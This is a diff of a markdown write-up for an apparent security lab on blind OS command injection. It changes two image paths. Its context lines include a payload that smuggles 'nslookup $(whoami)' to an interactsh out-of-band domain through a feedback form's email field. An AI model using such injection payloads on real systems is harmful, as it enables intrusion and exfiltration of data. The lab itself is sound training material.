@@ -12,13 +12,13 @@ Analysis :
 - After the installation process,
 - Start the interactsh-client
 
-![VirtualBoxVM_cjXMWqAhqw.png](Lab%20-%2004%202693c5d54c7680528d3bc19c55e90621/VirtualBoxVM_cjXMWqAhqw.png)
+![VirtualBoxVM_cjXMWqAhqw.png](Lab%20-%2004/VirtualBoxVM_cjXMWqAhqw.png)
 
 - This gives you the public domain you can use for oast style attacks
 - Again we are given that the vuln is in the feedback form, hence we retrieve the request first…
 - This time, the command is executed asynchronously and has no effect on the application's response.
 - When we use the payload [`qw@qw.com](mailto:qw@qw.com) & nslookup $(whoami).d30blkcgtqkkvta9geu05fbyg5pkdhrb1.oast.live #` in the email parameter. We will get the output like this…
 
-![VirtualBoxVM_acdpQ89rbt.png](Lab%20-%2004%202693c5d54c7680528d3bc19c55e90621/VirtualBoxVM_acdpQ89rbt.png)
+![VirtualBoxVM_acdpQ89rbt.png](Lab%20-%2004/VirtualBoxVM_acdpQ89rbt.png)
 
 - This would give us the output.
